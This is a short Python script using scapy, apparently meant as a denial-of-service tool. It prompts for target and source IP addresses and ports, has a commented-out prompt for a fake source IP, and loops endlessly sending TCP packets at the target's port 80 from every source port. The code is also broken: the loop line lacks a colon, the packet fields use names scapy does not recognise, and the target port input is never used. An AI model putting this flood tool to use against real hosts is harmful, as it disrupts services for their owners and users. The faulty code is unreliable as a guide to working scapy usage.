from scapy.all import *
import socket
import threading


target_ip = input('Enter targe IP address: ')
source_ip = input("Enter source IP address: ")
#fake_ip = input('Enter fake IP address: ')
target_port = int(input('Enter target Port number: '))
source_port = int(input('Enter source Port number: '))
i = 1


while True:
	for source_port in range(1, 65535)
		IP1 = IP(source_ip = source_ip, destination = target_ip)
		TCP1 = TCP(srcport = source_port, dstport = 80)
		pkt = IP1 / TCP1
		send(pkt, inter = .001)

		print('packet sent: ', i)
		i = i + 1

